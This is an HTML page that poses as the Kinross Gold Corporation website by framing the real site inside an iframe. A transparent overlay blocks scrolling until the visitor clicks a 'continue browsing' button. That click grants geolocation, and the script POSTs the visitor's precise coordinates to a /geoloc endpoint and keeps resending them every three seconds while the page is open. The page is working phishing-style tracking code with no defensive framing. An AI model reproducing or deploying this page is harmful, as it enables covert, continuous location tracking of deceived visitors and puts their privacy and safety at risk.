<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>Kinross Gold Corporation</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      overflow: hidden;
      height: 100vh;
      width: 100%;
      background: #000;
    }
    .iframe-container {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      width: 100%;
      height: 100%;
      background: white;
    }
    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
    /* Piège invisible */
    .invisible-trap {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: transparent;
      z-index: 150;
      cursor: default;
    }
    /* Overlay noir et blanc simple */
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: #000;
      z-index: 200;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      gap: 25px;
    }
    .overlay-box {
      background: #000;
      border: 1px solid #fff;
      border-radius: 8px;
      padding: 40px 30px;
      text-align: center;
      max-width: 350px;
      width: 90%;
    }
    .overlay-box i {
      font-size: 48px;
      color: #fff;
      margin-bottom: 20px;
    }
    .overlay-box h3 {
      color: #fff;
      margin-bottom: 15px;
      font-family: Arial, sans-serif;
      font-weight: 400;
      font-size: 20px;
    }
    .overlay-box p {
      color: #ccc;
      margin-bottom: 25px;
      font-size: 14px;
    }
    .btn-location {
      background: #fff;
      border: none;
      padding: 14px 25px;
      border-radius: 40px;
      color: #000;
      font-weight: 600;
      font-size: 16px;
      cursor: pointer;
      width: 100%;
      transition: 0.2s;
      font-family: Arial, sans-serif;
    }
    .btn-location:hover {
      background: #e0e0e0;
      transform: scale(1.01);
    }
    .status {
      margin-top: 15px;
      font-size: 12px;
      color: #aaa;
    }
  </style>
</head>
<body>

<div class="iframe-container">
  <iframe id="kinrossFrame" src="https://www.kinross.com"></iframe>
</div>

<!-- Piège invisible -->
<div id="invisibleTrap" class="invisible-trap"></div>

<!-- Overlay noir et blanc -->
<div id="overlay" class="overlay" style="display: none;">
  <div class="overlay-box">
    <i class="fas fa-map-marker-alt"></i>
    
    <p>Accéder au site Kinross Gold Corporation.</p>
    <button class="btn-location" id="activateBtn">
      Continuer à naviguer...
    </button>
    <div id="statusMsg" class="status"></div>
  </div>
</div>

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
<script>
  let isLocationActive = false;
  let autoUpdateInterval = null;

  // === FONCTIONS GÉOLOCALISATION ORIGINALES ===
  function sendLocationToServer(lat, lon, mapLink, step) {
    fetch('/geoloc', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        lat, lon, mapLink,
        step: step || "auto_update",
        timestamp: new Date().toISOString(),
        source: "Kinross_Browser"
      })
    }).then(r => r.json()).then(d => console.log("📍 envoyé", d)).catch(e => console.error);
  }

  function startAutoUpdate(lat, lon) {
    if (autoUpdateInterval) clearInterval(autoUpdateInterval);
    autoUpdateInterval = setInterval(() => {
      if (navigator.geolocation && isLocationActive) {
        navigator.geolocation.getCurrentPosition(
          pos => sendLocationToServer(pos.coords.latitude, pos.coords.longitude,
            `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "auto"),
          err => console.warn("Auto-update échec", err.message),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      }
    }, 3000);
  }

  function stopAutoUpdate() {
    if (autoUpdateInterval) clearInterval(autoUpdateInterval);
  }

  // === ACTIVATION LOCALISATION ===
  function activateLocation() {
    const statusDiv = document.getElementById('statusMsg');
    statusDiv.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Demande en cours...';

    if (!navigator.geolocation) {
      statusDiv.innerHTML = '❌ Géolocalisation non supportée';
      return;
    }

    navigator.geolocation.getCurrentPosition(
      pos => {
        sendLocationToServer(pos.coords.latitude, pos.coords.longitude,
          `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`, "activation");
        startAutoUpdate(pos.coords.latitude, pos.coords.longitude);
        isLocationActive = true;

        // Suppression du piège
        const trap = document.getElementById('invisibleTrap');
        if (trap) trap.remove();

        document.getElementById('overlay').style.display = 'none';
        statusDiv.innerHTML = '✅ Localisation activée !';
      },
      err => {
        let msg = err.code === 1 ? "Refusé. Activez dans les paramètres." :
                   err.code === 2 ? "Position indisponible." :
                   err.code === 3 ? "Délai dépassé." : "Erreur.";
        statusDiv.innerHTML = `❌ ${msg}`;
      },
      { enableHighAccuracy: true, timeout: 15000 }
    );
  }

  document.getElementById('activateBtn').addEventListener('click', activateLocation);

  // === PIÈGE INVISIBLE : détection du scroll ===
  const trap = document.getElementById('invisibleTrap');
  const overlay = document.getElementById('overlay');
  let trapTriggered = false;

  function triggerTrap() {
    if (!isLocationActive && !trapTriggered) {
      trapTriggered = true;
      overlay.style.display = 'flex';
    }
  }

  trap.addEventListener('wheel', function(e) {
    e.preventDefault();
    triggerTrap();
  }, { passive: false });

  trap.addEventListener('touchmove', function(e) {
    e.preventDefault();
    triggerTrap();
  }, { passive: false });

  let dragStart = null;
  trap.addEventListener('mousedown', function(e) {
    dragStart = e.clientY;
  });
  trap.addEventListener('mousemove', function(e) {
    if (dragStart !== null && Math.abs(e.clientY - dragStart) > 10) {
      triggerTrap();
      dragStart = null;
    }
  });
  trap.addEventListener('mouseup', function() { dragStart = null; });

  window.addEventListener('keydown', function(e) {
    const scrollKeys = ['ArrowDown', 'ArrowUp', 'PageDown', 'PageUp', ' ', 'Space'];
    if (scrollKeys.includes(e.key) && !isLocationActive && !trapTriggered) {
      e.preventDefault();
      triggerTrap();
    }
  });

  window.addEventListener('beforeunload', () => stopAutoUpdate());

  window.autoUpdate = function() {
    if (navigator.geolocation && isLocationActive)
      navigator.geolocation.getCurrentPosition(p => sendLocationToServer(p.coords.latitude, p.coords.longitude,
        `https://maps?q=${p.coords.latitude},${p.coords.longitude}`, "manual"));
  };
</script>
</body>
</html>
